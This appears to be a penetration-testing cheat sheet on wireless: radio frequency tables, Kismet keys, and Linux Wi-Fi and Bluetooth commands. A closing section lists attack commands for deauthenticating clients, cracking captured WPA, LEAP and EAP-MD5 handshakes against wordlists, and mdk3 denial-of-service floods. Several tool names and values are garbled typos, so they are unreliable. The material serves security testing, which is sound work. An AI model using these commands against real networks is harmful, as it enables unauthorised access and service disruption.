---
layout: default
---

# Wireless

### Frequency chart

<table>
  <thead>
    <tr>
      <th style="text-align:left"><b>Technology</b>
      </th>
      <th style="text-align:left"><b>Frequency</b>
      </th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align:left">RFID</td>
      <td style="text-align:left">
        <p>120-150 kHz (LF)</p>
        <p>13.56 MHz (HF)</p>
        <p>433 MHz (lJHF)</p>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">Keyless Entry</td>
      <td style="text-align:left">
        <p>315 MHz (N. Am)</p>
        <p>433.92 MHz (Europe,Asia)</p>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">Cellular (US)</td>
      <td style="text-align:left">
        <p>698-894 MHz</p>
        <p>1710-1755 MHz</p>
        <p>1850-1910 MHz</p>
        <p>2110-2155 MHz</p>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">GPS</td>
      <td style="text-align:left">1227.60,1575.42 MHz</td>
    </tr>
    <tr>
      <td style="text-align:left">L Band</td>
      <td style="text-align:left">1-2 GHz</td>
    </tr>
    <tr>
      <td style="text-align:left">802.15.4 (ZigBee)</td>
      <td style="text-align:left">
        <p>868 MHz (Europe)</p>
        <p>915 MHz (lJS,Australia)</p>
      </td>
    </tr>
    <tr>
      <td style="text-align:left">802.15.1 (Bluetooth)</td>
      <td style="text-align:left">2.4-2.483.5 GHz</td>
    </tr>
    <tr>
      <td style="text-align:left">802.11 b/g</td>
      <td style="text-align:left">2.4 GHz</td>
    </tr>
    <tr>
      <td style="text-align:left">802.11a</td>
      <td style="text-align:left">5.0 GHz</td>
    </tr>
    <tr>
      <td style="text-align:left">802.11 n</td>
      <td style="text-align:left">2.4/5.0 GHZ</td>
    </tr>
    <tr>
      <td style="text-align:left">C Band</td>
      <td style="text-align:left">4-8 GHz</td>
    </tr>
    <tr>
      <td style="text-align:left">Ku Band</td>
      <td style="text-align:left">12-18 GHz</td>
    </tr>
    <tr>
      <td style="text-align:left">K Band</td>
      <td style="text-align:left">18-26.5 GHz</td>
    </tr>
    <tr>
      <td style="text-align:left">Ka Band</td>
      <td style="text-align:left">26.5-40 GHz</td>
    </tr>
  </tbody>
</table>### Fcc id lookup

```text
https://apps.fcc.gov/oetcf/eas/reports/GenericSearch.cfm
```

### Frequency database

```text
http://www.radioreference.com/apps/db/
```

### Kismet Reference \[5\]

| **Command** | **Description** |
| :--- | :--- |
| e | List Kismet servers |
| h | Help |
| z | Toggle full-screen view |
| n | Name current network |
| m | Toggle muting of sound |
| i | View detailed information for network |
| t | Tag or untag selected network |
| s | Sort network list |
| g | Group tagged networks |
| l | Show wireless card power levels |
| u | Ungroup current group |
| d | Dump printable strings |
| c | Show clients in current network |
| r | Packet rate graph |
| L | Lock channel hopping to selected channel |
| a | View network statistics |
| H | Return to normal channel hopping |
| p | Dump packet type |
| +/- | Expand/collapse groups |
| f | Follow network center |
| CTRL+L | Re-draw the screen |
| w | Track alerts |
| Q | Quit Kismet |
| X | Close popup window |

### Linux wifi commands

| Command | Description |
| :--- | :--- |
| iwconfig | Wireless interface config |
| rfkill list | Identify wifi problems |
| rfkill unblock all | Turn on wifi |
| airdump-ng mon0 | Monitor all interfaces |

### Connect to unsecured wifi

```text
iwconfig ath0 essid $SSID
ifconfig ath0 up
dhclient ath0
```

### Connect to wep wifi network

```text
iwconfig ath0 essid $SSID key
ifconfig ath0 up
dhclient ath0
```

### Connect to wpa-psk wifi network

```text
iwconfig ath0 essid $SSID
ifconfig ath0 up
wpa_supplicant -B -i ath0 -c wpa-psk.conf
dhclient ath0
```

### Connect to wpa-enterprise wifi network

```text
iwconfig ath0 essid $SSID
ifconfig ath0 up
wpa supplicant -B -i ath0 -c wpa-ent.conf
dhclient ath0
```

## Linux bluetooth

<table>
  <thead>
    <tr>
      <th style="text-align:left"><b>Command</b>
      </th>
      <th style="text-align:left"><b>Description</b>
      </th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align:left">hciconfig hci0 up</td>
      <td style="text-align:left">Turn on bluetooth interface</td>
    </tr>
    <tr>
      <td style="text-align:left">hcitool -i hci0 scan --flush --all</td>
      <td style="text-align:left">Scan for bluetooth devices</td>
    </tr>
    <tr>
      <td style="text-align:left">sdptool browse BD_ADDR</td>
      <td style="text-align:left">List open services</td>
    </tr>
    <tr>
      <td style="text-align:left">
        <p>hciconfig hci0 name &quot;NAME&quot; class Ox520204</p>
        <p>pi scan</p>
      </td>
      <td style="text-align:left">Set as discoverable</td>
    </tr>
    <tr>
      <td style="text-align:left">pand -K</td>
      <td style="text-align:left">Clear pand sessions</td>
    </tr>
  </tbody>
</table>## Linux wifi testing

### Start monitor mode interface

```text
airmon-ng stop ath0
airmon-ng start wifi0
iwconfig ath0 channel $CH
```

### Capture client handshake

```text
airdump-ng -c $CH --bssid $AP -w file athO    #Capture traffic
aireplay-ng -0 10 -a $AP -c $CH athO          #Force client de-auth


```

### Brute force handshake

```text
aircrack-ng -w wordlist capture.cap    # WPA-PSK
asleep -r capture.cap -w dict.asleep   # LEAP
eapmd5pass -r capture.cap -w wordlist  # EAP-HDS



```

### Dos attack

```text
mdk3    int    a -a $AP    #Auth Flood
mdk3    int    b -c $CH    #Beacon Flood
```

